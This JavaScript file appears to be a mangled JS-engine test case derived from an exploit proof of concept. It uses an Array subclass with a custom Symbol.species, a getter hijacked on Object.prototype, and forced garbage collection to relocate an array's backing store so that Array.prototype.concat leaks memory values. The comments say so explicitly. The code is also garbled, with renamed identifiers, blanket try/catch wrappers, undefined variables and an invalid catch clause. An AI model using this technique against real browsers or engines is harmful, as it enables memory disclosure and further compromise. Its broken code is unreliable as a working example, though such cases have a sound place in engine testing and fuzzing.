var o0 = new Proxy([], {});
var e = Object.prototype.defineProperty;

class o2 extends Array {
    static get [Symbol.species]() {
        try {
return function() { try {
return o2;
}catch(o421.o148 & 0xFF00){} }
}catch(startsWith){}
    }; // custom constructor which returns a proxy object
}

var o853 = 1;
try {
o3[1] = 0.1;
}catch(e){}
try {
o492.o491.o498 = 300;
}catch(e){}

function o4() {
    try {
for (var o5 = 0; o5 < 0x100000; ++o5) {
        var o6 = new String();
    }
}catch(e){}
}

function o7() {
    try {
o3.length = 1;
}catch(e){} // shorten the array so the backstore pointer is relocated
    try {
o4();
}catch(e){}         // force gc to move the array's elements backstore
    try {
return o1;
}catch(e){}
}

try {
Object.prototype.__defineGetter__("defineProperty", o7);
}catch(e){}

var o8 = Array.prototype.concat.call(o3);

try {
for (var o5 = 0; o5 < 20; o5++) { // however many values you want to leak
    try {
o9.o10(o8[o5]);
}catch(e){}
}
}catch(e){}